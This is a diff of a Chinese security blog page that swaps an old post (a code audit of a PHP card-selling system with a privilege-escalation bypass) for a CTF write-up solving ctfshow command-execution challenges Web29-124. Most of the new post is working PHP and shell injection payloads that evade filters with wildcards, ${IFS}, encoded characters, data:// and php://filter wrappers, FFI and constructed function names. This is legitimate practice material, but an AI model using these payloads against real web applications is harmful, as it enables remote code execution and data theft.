@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">faka | Troy3e</title>
+  <title itemprop="name">Web29-124命令执行 | Troy3e</title>
   
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -185,11 +185,11 @@
 
   <div class="pattern-center single-center">
     <!-- 有配图默认渲染第一张 -->
-    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1151994.png);" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1151994.png">
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1160485.png);" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1160485.png">
     </div>
     <header class="pattern-header single-header">
       <h1 class="entry-title">
-      faka</h1>
+      Web29-124命令执行</h1>
       <p class="entry-census">
         <span>
           <a href="">
@@ -201,7 +201,7 @@
         </span>
         <span class="bull">
         ·</span>
-        2021-6-21<span class="bull">
+        2021-7-26<span class="bull">
         ·</span>
       <span id="busuanzi_value_page_pv"></span>次阅读</p>
     </header>
@@ -215,35 +215,153 @@
         <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
         
         <div class="entry-content">
-          <p>最近正好在学习代码审计，但是因为期末的原因，一些大的cms都没有耐心仔细钻研。今天偶然在安全客上看到个很久之前做过的发卡系统，当时因为没有仔细研究导致印象不深，今天就以审计的角度再来看看这道题。<br>链接：<a href="https://www.anquanke.com/post/id/243357" target="_blank" rel="noopener">https://www.anquanke.com/post/id/243357</a><br><a href="https://blog.csdn.net/rfrder/article/details/115067196" target="_blank" rel="noopener">https://blog.csdn.net/rfrder/article/details/115067196</a></p>
-<h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><p>随便访问manage下的一个路由 /manage/Goods，都会跳转到登陆界面。看一下访问admin节点所需要的权限：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210621203800.png" alt></p>
-<p>再看下system/node这个表，is_auth代表需要权限验证，is_login代表需要登录，那么看is_auth为0的地方就有可能存在越权。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210621204256.png" alt></p>
-<p>漏洞点：application/admin/controller/Index.php</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210621213017.png" alt></p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210621213052.png" alt></p>
-<p>跟进下面的post处理，把post参数给$data，然后把password给md5,再对$data调用_form_filter这个回调方法：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210621213313.png" alt></p>
-<p>_form里面那个array_merge将所有post请求存入数组，下面这_form_filter又用authorize判定权限，再结合我们一开始分析的数据库，这里只要post个authorize=3即可：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210621213740.png" alt></p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210621214049.png" alt></p>
-<p>成功创建高权限账号。<br>但是有一点没搞明白，就是：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210621214159.png" alt></p>
-<p>不知道这里咋调试的，我在本地搭了环境一直连不上数据库不知道甚么原因。<br>还有就是越权根本原因，按下图所示，admin下的节点都是被控制的，那么为什么还会被绕过呢？</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210621214501.png" alt></p>
-<p>这就要看判断权限的代码：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210621214716.png" alt></p>
-<p>这里有默认值，node无论如何不可能为admin，就算访问/也是index/index/index。</p>
-<h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><p>这个比较简单，seay都扫出来了：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210621214951.png" alt></p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210621215040.png" alt></p>
-<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210621220215.png" alt></p>
-<p>后面调着调着忘记写了，看开始的两个链接就行。这个地方也不是很难。最后那里控制后缀名还给我一种故意放了个漏洞的感觉，不知道开发者为啥要这么写：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210621223125.png" alt><br>强制拼接它不好么</p>
-<h2 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h2><p>phar反序列化给我的感觉是知道但不了解，随着学习的深入，我必须对这些基本的知识去重新挖掘一下。</p>
-<p>参考：<a href="https://www.anquanke.com/post/id/243357#h2-3" target="_blank" rel="noopener">https://www.anquanke.com/post/id/243357#h2-3</a></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最近一个月脑子非常乱，一度想放弃安全转开发，但是最近一星期发生的许多事情让我坚定了在安全这条路上走下去的决心。<br>暂且定一下暑期的任务：<br>1、实习两个月。<br>2、每天都必须学一些新的知识并深入探索其原理，CTF题目或是复现漏洞。<br>3、冲一冲src。<br>4、有空学一学java。</p>
+          <p>命令执行就很有意思了~<br>简单的就不赘述了，可能对新手不太友好。</p>
+<h2 id="Web29"><a href="#Web29" class="headerlink" title="Web29"></a>Web29</h2><pre><code>c=system(&#39;cat fla*&#39;);
+</code></pre><h2 id="Web30"><a href="#Web30" class="headerlink" title="Web30"></a>Web30</h2><pre><code>c=echo `cat fl*`;
+</code></pre><h2 id="Web31"><a href="#Web31" class="headerlink" title="Web31"></a>Web31</h2><pre><code>c=echo%09`tac%09fla*`%3B
+</code></pre><h2 id="Web32"><a href="#Web32" class="headerlink" title="Web32"></a>Web32</h2><pre><code>c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php
+</code></pre><h2 id="Web33"><a href="#Web33" class="headerlink" title="Web33"></a>Web33</h2><pre><code>c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php
+</code></pre><h2 id="Web34"><a href="#Web34" class="headerlink" title="Web34"></a>Web34</h2><pre><code>c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php
+</code></pre><h2 id="Web35"><a href="#Web35" class="headerlink" title="Web35"></a>Web35</h2><pre><code>c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php
+</code></pre><h2 id="Web36"><a href="#Web36" class="headerlink" title="Web36"></a>Web36</h2><pre><code>c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php
+</code></pre><h2 id="Web37"><a href="#Web37" class="headerlink" title="Web37"></a>Web37</h2><pre><code>c=data://text/palin,&lt;?php system(&#39;cat fl*&#39;);?&gt;
+</code></pre><h2 id="Web38"><a href="#Web38" class="headerlink" title="Web38"></a>Web38</h2><pre><code>c=data://text/plain,&lt;?=system(&#39;cat fla*&#39;);?&gt;
+</code></pre><h2 id="Web39"><a href="#Web39" class="headerlink" title="Web39"></a>Web39</h2><pre><code>c=data://text/palin,&lt;?php system(&#39;cat fl*&#39;);?&gt;
+</code></pre><h2 id="Web40"><a href="#Web40" class="headerlink" title="Web40"></a>Web40</h2><p>scandir(’.’):扫描当前目录<br>localeconv() 函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是.<br>pos(),current():返回数组第一个值</p>
+<p>c=print_r(scandir(pos(localeconv())));<br>查看目录</p>
+<p>读flag</p>
+<p>c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</p>
+<p>c=show_source(array_rand(array_flip(scandir(pos(localeconv())))));<br>先交换键值键名，然后随机返回。</p>
+<p>最后一个方法很有意思</p>
+<p>session_start(): 告诉PHP使用session;<br>session_id(): 获取到当前的session_id值；<br>手动设置cookie中PHPSESSID=flag.php；</p>
+<p><a href="http://f34e0b19-a97f-44d7-a3e5-9fcaf4913f00.challenge.ctf.show:8080/?c=session_start();system(session_id())" target="_blank" rel="noopener">http://f34e0b19-a97f-44d7-a3e5-9fcaf4913f00.challenge.ctf.show:8080/?c=session_start();system(session_id())</a>;</p>
+<p>PHPSESSID=ls</p>
+<h2 id="Web41"><a href="#Web41" class="headerlink" title="Web41"></a>Web41</h2><p>用或运算构造即可，脚本自己随便写一个就行。<br>要注意的是这边命令执行需要闭合和注释。</p>
+<pre><code>c=&#39;|||||||||||&#39;);(&#39;%13%19%13%14%05%0D&#39;|&#39;%60%60%60%60%60%60&#39;)((&#39;%03%01%14&#39;|&#39;%60%60%60&#39;).&#39; &#39;.(&#39;%06%0C%01%07%02%10%08%10&#39;|&#39;%60%60%60%60%2C%60%60%60&#39;));//
+</code></pre><h2 id="Web42"><a href="#Web42" class="headerlink" title="Web42"></a>Web42</h2><p>这条命令的意思就是在后台执行这个程序,并将错误输出2重定向到标准输出1,然后将标准输出1全部放到/dev/null文件,也就是清空.<br>所以可以看出” &gt;/dev/null 2&gt;&amp;1 “常用来避免shell命令或者程序等运行中有内容输出。</p>
+<p>截断即可<br>c=cat flag.php%0a</p>
+<p>ps：%26以及||也能截断。</p>
+<h2 id="Web43"><a href="#Web43" class="headerlink" title="Web43"></a>Web43</h2><p>c=tac flag.php%0A</p>
+<h2 id="Web44"><a href="#Web44" class="headerlink" title="Web44"></a>Web44</h2><p>c=tac f*%0A</p>
+<h2 id="Web45"><a href="#Web45" class="headerlink" title="Web45"></a>Web45</h2><p>c=tac%09f*%0A</p>
+<h2 id="Web46"><a href="#Web46" class="headerlink" title="Web46"></a>Web46</h2><p>c=tac%09fl\ag.php%0A</p>
+<h2 id="Web47"><a href="#Web47" class="headerlink" title="Web47"></a>Web47</h2><p>c=tac%09fl\ag.php%0A</p>
+<h2 id="Web48"><a href="#Web48" class="headerlink" title="Web48"></a>Web48</h2><p>c=tac%09fl\ag.php%0A</p>
+<h2 id="Web49"><a href="#Web49" class="headerlink" title="Web49"></a>Web49</h2><p>c=tac%09fl\ag.php%0A</p>
+<h2 id="Web50"><a href="#Web50" class="headerlink" title="Web50"></a>Web50</h2><p>c=tac&lt;&gt;fl\ag.php%0A</p>
+<h2 id="Web51"><a href="#Web51" class="headerlink" title="Web51"></a>Web51</h2><p>c=nl&lt;&gt;fl\ag.php%0A</p>
+<h2 id="Web52"><a href="#Web52" class="headerlink" title="Web52"></a>Web52</h2><p>c=nl${IFS}/fl\ag%0A<br>注：flag.php是个假flag</p>
+<h2 id="Web53"><a href="#Web53" class="headerlink" title="Web53"></a>Web53</h2><p>c=c’’at${IFS}fl\ag.ph\p</p>
+<h2 id="Web54"><a href="#Web54" class="headerlink" title="Web54"></a>Web54</h2><p>表达式 .* 就是单个字符匹配任意次，即贪婪匹配。比如caat、c\at、c’’at等。<br>解决方法是直接调用bin目录下的命令<br>c=/bin/ca?${IFS}f???????</p>
+<h2 id="Web55"><a href="#Web55" class="headerlink" title="Web55"></a>Web55</h2><p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210716180736.png" alt></p>
+<p>上传sh命令至tmp目录，然后用linux通配符匹配到对应文件<br>.代表source执行sh命令。</p>
+<p>p牛：<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#php5shell" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#php5shell</a></p>
+<p>也可以直接通配符<br>/???/????64 ????????       /bin/base64 flag.php<br>/???/???/????2 ????????     /usr/bin/bzip2 flag.php</p>
+<h2 id="Web56"><a href="#Web56" class="headerlink" title="Web56"></a>Web56</h2><p>上题p神的解法。</p>
+<h2 id="Web57"><a href="#Web57" class="headerlink" title="Web57"></a>Web57</h2><p>字母数字基本都没了，但是flag被换成了36，所以想办法构造36即可。<br>括号和$还在：<br>双小括号 (( )) 是 Bash Shell 中专门用来进行整数运算的命令，它的效率很高，写法灵活，是企业运维中常用的运算命令。<br>通俗地讲，就是将数学运算表达式放在((和))之间。<br>表达式可以只有一个，也可以有多个，多个表达式之间以逗号,分隔。对于多个表达式的情况，以最后一个表达式的值作为整个 (( ))命令的执行结果。<br>可以使用$获取 (( )) 命令的结果，这和使用$获得变量值是类似的。<br>可以在 (( )) 前面加上$符号获取 (( )) 命令的执行结果，也即获取整个表达式的值。以 c=$((a+b)) 为例，即将 a+b 这个表达式的运算结果赋值给变量 c。<br>注意，类似 c=((a+b)) 这样的写法是错误的，不加$就不能取得表达式的结果。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210716235018.png" alt></p>
+<p>$(())是0<br>$((~$(()))) 0取反是-1<br>$((~-37))  -37取反是36<br>$(($((~$(())))$((~$(())))))  连起来默认相加是-2<br>所以37个-1连起来就行。</p>
+<pre><code>$((~$((     $((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))        ))))
+</code></pre><h2 id="Web58"><a href="#Web58" class="headerlink" title="Web58"></a>Web58</h2><p>c=highlight_file(‘flag.php’);</p>
+<h2 id="Web59"><a href="#Web59" class="headerlink" title="Web59"></a>Web59</h2><p>58的payload也行，其他姿势：</p>
+<pre><code>c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));
+//通过单一函数读取文件
+c=echo file_get_contents(&quot;flag.php&quot;);
+c=readfile(&quot;flag.php&quot;);
+c=var_dump(file(&#39;flag.php&#39;));
+c=print_r(file(&#39;flag.php&#39;));
+//这里做一个解释`file — 把整个文件读入一个数组中`
+通过fopen去读取文件内容，这里介绍下函数
+fread()
+fgets()
+fgetc()
+fgetss()
+fgetcsv()
+gpassthru()
+payload:
+c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) {$line = fgets($a);echo $line;}//一行一行读取
+c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) {$line = fgetc($a);echo $line;}//一个一个字符读取
+c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) {$line = fgetcsv($a);var_dump($line);}
+</code></pre><h2 id="Web60"><a href="#Web60" class="headerlink" title="Web60"></a>Web60</h2><pre><code>copy(&quot;flag.php&quot;,&quot;flag.txt&quot;);
+rename(&quot;flag.php&quot;,&quot;flag.txt&quot;);
+c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) {$line = fgetc($a);echo $line;}
+c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) {$line = fgetcsv($a);print_r($line);}
+</code></pre><h2 id="Web61"><a href="#Web61" class="headerlink" title="Web61"></a>Web61</h2><pre><code>c=highlight_file(&#39;flag.php&#39;);
+</code></pre><h2 id="Web62"><a href="#Web62" class="headerlink" title="Web62"></a>Web62</h2><pre><code>c=highlight_file(&#39;flag.php&#39;);
+</code></pre><h2 id="Web63"><a href="#Web63" class="headerlink" title="Web63"></a>Web63</h2><pre><code>c=highlight_file(&#39;flag.php&#39;);
+</code></pre><h2 id="Web64"><a href="#Web64" class="headerlink" title="Web64"></a>Web64</h2><pre><code>c=highlight_file(&#39;flag.php&#39;);
+</code></pre><h2 id="Web65"><a href="#Web65" class="headerlink" title="Web65"></a>Web65</h2><pre><code>c=highlight_file(&#39;flag.php&#39;);
+</code></pre><h2 id="Web66"><a href="#Web66" class="headerlink" title="Web66"></a>Web66</h2><pre><code>c=highlight_file(&#39;/flag.txt&#39;);
+</code></pre><h2 id="Web67"><a href="#Web67" class="headerlink" title="Web67"></a>Web67</h2><pre><code>c=highlight_file(&#39;/flag.txt&#39;);
+</code></pre><h2 id="Web68"><a href="#Web68" class="headerlink" title="Web68"></a>Web68</h2><p>读目录</p>
+<pre><code>var_dump(scandir(&#39;/&#39;));
+c=$a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f){echo($f-&gt;__toString().&quot; &quot;);}
+</code></pre><p>第二个payload解释一下：<br>外部调用DirectoryIterator时，传入一个目录路径字符串，实例化DirectoryIterator类。<br>用foreach或者while遍历目录：</p>
+<pre><code>&lt;?php
+//遍历目录下的所有文件
+$dir = new DirectoryIterator(dirname(__FILE__));
+//1、foreach直接循环
+foreach ($dir as $file){
+    if($file-&gt;isFile()){
+        echo $file-&gt;getFilename().&quot;&lt;br /&gt;&quot;;
+    }
+}
+</code></pre><p>glob:// 则是查找匹配的文件路径模式，glob:///*代表根目录下的所有文件。<br>最后输出直接echo $f也是可以的。</p>
+<p>然后include即可。</p>
+<h2 id="Web69"><a href="#Web69" class="headerlink" title="Web69"></a>Web69</h2><pre><code>include &#39;/flag.txt&#39;;
+</code></pre><h2 id="Web70"><a href="#Web70" class="headerlink" title="Web70"></a>Web70</h2><pre><code>include &#39;/flag.txt&#39;;
+</code></pre><h2 id="Web71"><a href="#Web71" class="headerlink" title="Web71"></a>Web71</h2><p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210719104955.png" alt></p>
+<pre><code>c=include &#39;/flag.txt&#39;;exit();
+</code></pre><p>提前结束</p>
+<h2 id="Web72"><a href="#Web72" class="headerlink" title="Web72"></a>Web72</h2><p>这里没法直接读了，应该是设置了openbase_dir。<br>首先扫目录：</p>
+<pre><code>c=$a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f){echo($f-&gt;__toString().&quot; &quot;);};exit();
+</code></pre><p>然后include一下flag0.txt，g，又忘了设置了openbase。<br>蚁剑试一下。<br>蚁剑也g了。</p>
+<p>看了下师傅们的博客，用的是这个：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210719115025.png" alt></p>
+<p>脚本网上都有</p>
+<h2 id="Web73"><a href="#Web73" class="headerlink" title="Web73"></a>Web73</h2><p>flagc.txt</p>
+<h2 id="Web74"><a href="#Web74" class="headerlink" title="Web74"></a>Web74</h2><p>flagx.txt</p>
+<h2 id="Web75"><a href="#Web75" class="headerlink" title="Web75"></a>Web75</h2><p>利用mysql load_file读文件</p>
+<pre><code>c=try {$dbh = new PDO(&#39;mysql:host=localhost;dbname=ctftraining&#39;, &#39;root&#39;,&#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;/flag36.txt&quot;)&#39;) as $row){echo($row[0]).&quot;|&quot;; }$dbh = null;}catch (PDOException $e) {echo $e-&gt;getMessage();exit(0);}exit(0);
+</code></pre><h2 id="Web76"><a href="#Web76" class="headerlink" title="Web76"></a>Web76</h2><pre><code>c=try {$dbh = new PDO(&#39;mysql:host=localhost;dbname=ctftraining&#39;, &#39;root&#39;,&#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;/flag36d.txt&quot;)&#39;) as $row){echo($row[0]).&quot;|&quot;; }$dbh = null;}catch (PDOException $e) {echo $e-&gt;getMessage();exit(0);}exit(0);
+</code></pre><h2 id="Web77"><a href="#Web77" class="headerlink" title="Web77"></a>Web77</h2><p><a href="https://www.php.cn/php-weizijiaocheng-415807.html" target="_blank" rel="noopener">https://www.php.cn/php-weizijiaocheng-415807.html</a></p>
+<pre><code>c=$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);$a=&#39;/readflag &gt; 1.txt&#39;;$ffi-&gt;system($a);exit();
+</code></pre><p>php&gt;=7.4。</p>
+<p>无语了。。。下面这部分放上去hexo就报错。。。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210726165017.png" alt></p>
+<h2 id="Web123"><a href="#Web123" class="headerlink" title="Web123"></a>Web123</h2><p>老题了，通过数学函数构造命令。</p>
+<p>抄yu22x师傅的博客了，写的很详细：</p>
+<pre><code>base_convert(number,frombase,tobase);
+参数    描述
+number        必需。规定要转换的数。
+frombase    必需。规定数字原来的进制。介于 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。
+tobase        必需。规定要转换的进制。介于 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。
+bindec — 二进制转换为十进制
+bindec ( string $binary_string ) : number
+decbin — 十进制转换为二进制
+decbin ( int $number ) : string
+dechex — 十进制转换为十六进制
+dechex ( int $number ) : string
+decoct — 十进制转换为八进制
+decoct ( int $number ) : string
+hexdec — 十六进制转换为十进制
+hexdec ( int $number ) : string
+</code></pre><p>在这个题中，我们不能使用除题目白名单中给出的函数以外的任何字符。那我们的目的就是构造出字母或者构造出函数。<br>假设我们要构造出如下表达式</p>
+<pre><code>c=$_GET[a]($_GET[b])&amp;a=system&amp;b=cat flag
+</code></pre><p>我们需要构造的是其实只有 _GET，$我们可用使用，中括号可用用花括号代替，小括号也是可以使用的。这时候我们想到了一个办法，如果可以构造出hex2bin函数就可以将16进制转换成字符串了。我们又可以用decoct将10进制转换成16进制。也就是可以将10进制转换成字符串。<br>那么问题来了，hex2bin怎么构造呢，这时候就需要用到base_convert了。<br>我们发现36进制中包含了所有的数字和字母，所有只需要将hex2bin按照36进制转换成10进制就可以了。</p>
+<pre><code>echo base_convert(&#39;hex2bin&#39;, 36, 10);
+结果  37907361743
+echo hexdec(bin2hex(&quot;_GET&quot;));
+结果 1598506324
+</code></pre><p>现在我们要做的就是反过来了</p>
+<pre><code>base_convert(&#39;37907361743&#39;,10,36);    hex2bin
+
+base_convert(&#39;37907361743&#39;,10,36)(dechex(&#39;1598506324&#39;));    _GET
+
+c=$pi=_GET;$$pi{abs}($$pi{acos})&amp;abs=system&amp;acos=tac f*
+</code></pre><p>payload</p>
+<pre><code>payload:c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{abs}($$pi{acos})&amp;abs=system&amp;acos=tac f*
+</code></pre><p>总结：hex2bin把16进制转字符，dechex把16进制转没有字符的十进制，这样便是全数字了。</p>
 
         </div>
         <!-- .entry-content -->
@@ -275,15 +393,15 @@
           
             <div class="post-nepre half previous">
           
-            <a href="/2021/07/26/Web1-20信息收集/" rel="prev">
+            <a href="/2021/07/26/Web78-117文件包含/" rel="prev">
               <div class="background">
-                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1161029.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1161029.jpg">
+                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1159230.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1159230.jpg">
               </div>
               <span class="label">
               Previous Post</span>
               <div class="info">
                 <h3>
-                Web1-20信息收集</h3>
+                Web78-117文件包含</h3>
                 <hr>
               </div>
             </a>
@@ -293,15 +411,15 @@
           
             <div class="post-nepre half next">
           
-            <a href="/2021/06/08/极致CMS漏洞整合与分析/" rel="next">
+            <a href="/2021/07/26/Web21-28爆破/" rel="next">
               <div class="background">
-                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-304364.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-304364.jpg">
+                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1160484.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1160484.png">
               </div>
               <span class="label">
               Next Post</span>
               <div class="info">
                 <h3>
-                极致CMS漏洞整合与分析</h3>
+                Web21-28爆破</h3>
                 <hr>
               </div>
             </a>
